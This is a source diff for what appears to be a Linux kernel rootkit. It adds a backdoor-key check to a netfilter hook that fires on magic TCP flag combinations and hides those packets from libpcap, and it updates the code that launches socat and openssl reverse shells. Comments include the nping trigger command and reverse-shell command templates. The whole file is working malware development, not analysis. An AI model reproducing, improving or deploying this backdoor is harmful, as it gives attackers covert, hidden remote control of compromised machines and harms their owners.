@@ -19,6 +19,8 @@
 #include <linux/kthread.h>
 #include "fs.h"
 #include "lkm.h"
+#include "log.h"
+#include "bdkey.h"
 
 static LIST_HEAD(iph_node);
 struct iph_node_t {
@@ -67,10 +69,14 @@ static const char *_locate_bdbin(int port) {
     for (i = 0; i < BD_OPS_SIZE && stat_ops[i].kv_port != RR_NULL; ++i) {
         if (port != stat_ops[i].kv_port) continue;
         for (x = 0; x < BD_PATH_NUM; ++x) {
+            struct path path;
             struct kstat stat;
-            /** return 0 if file is found */
-            if (fs_file_stat(stat_ops[i].bin[x], &stat) == 0)
+            if (fs_kern_path(stat_ops[i].bin[x], &path) && fs_file_stat(&path, &stat)) {
+                path_put(&path);
+
+                /** file was found */
                 return stat_ops[i].bin[x];
+            }
         }
     }
     return NULL;
@@ -156,7 +162,8 @@ static char *_build_bd_command(const char *exe, uint16_t dst_port,
                      * same as RR_SOCAT but on dst port RR_SOCAT_TTY
                      */
                     //"%s OPENSSL:%s:%s,verify=0 EXEC:\"tail -F -n +1 /var/.<random>\""
-                    char *tty = sys_ttyfile();
+
+                    char *tty = sys_get_ttyfile();
                     if (tty) {
                         int len;
                         char ip[INET_ADDRSTRLEN+1] = {0};
@@ -190,7 +197,8 @@ static char *_build_bd_command(const char *exe, uint16_t dst_port,
                      * openssl s_server -key key.pem -cert cert.pem -accept <#PORT>
                      * trigger: nping <IP> --tcp -p RR_OPENSSL --flags fin,urg,ack --source-port <#PORT> -c 1
                      */
-                    char *ssl = sys_sslfile();
+
+                    char *ssl = sys_get_sslfile();
                     if (ssl) {
                         int len;
                         char ip[INET_ADDRSTRLEN+1] = {0};
@@ -418,21 +426,31 @@ static int _bd_watchdog(void *t)
 #endif
 }
 
-/**
- *  if TCP flags are:
- *  FUCK, CUNT or ASS then you know...
- */
-bool kv_check_cursing(struct tcphdr *t) {
-    uint8_t fuckoff = 0;
+bool kv_check_bdkey(struct tcphdr *t, struct sk_buff *skb) {
+    uint8_t silly_word = 0;
     enum { FUCK=0x8c, CUNT=0xa5, ASS=0x38 };
 
-    fuckoff = t->fin << 7| t->syn << 6| t->rst << 5| t->psh << 4|
+    silly_word = t->fin << 7| t->syn << 6| t->rst << 5| t->psh << 4|
         t->ack << 3| t->urg << 2| t->ece <<1| t->cwr;
 
-    //sudo nping <IP> --tcp -p <dst port> --flags <flag1,flag2,...> --source-port <reverse shell port> -c 1
-    if (fuckoff == FUCK || fuckoff == CUNT || fuckoff == ASS)
-        return true;
+    if (silly_word == FUCK || silly_word == CUNT || silly_word == ASS)
+    {
+        uint64_t address_value = 0;
+        unsigned char *data = skb->data + 40;
 
+        if (skb->len >= sizeof(struct tcphdr) + sizeof(struct iphdr) + 8) {
+            address_value = ((unsigned long)data[0] << 56) |
+                ((unsigned long)data[1] << 48) |
+                ((unsigned long)data[2] << 40) |
+                ((unsigned long)data[3] << 32) |
+                ((unsigned long)data[4] << 24) |
+                ((unsigned long)data[5] << 16) |
+                ((unsigned long)data[6] << 8)  |
+                (unsigned long)data[7];
+            if (address_value == BDKEY)
+                return true;
+        }
+    }
     return false;
 }
 
@@ -453,7 +471,7 @@ static unsigned int _sock_hook_nf_cb(void *priv, struct sk_buff *skb,
                 int dst = _check_bdports(htons(tcph->dest));
 
                 /** Silence libpcap on CUNT/ASS/FUCK */
-                if (dst == RR_NULL || !kv_check_cursing(tcph)) break;
+                if (dst == RR_NULL || !kv_check_bdkey(tcph, skb)) break;
 
                 kf = kzalloc(sizeof(struct kfifo_priv), GFP_KERNEL);
                 if (!kf) {
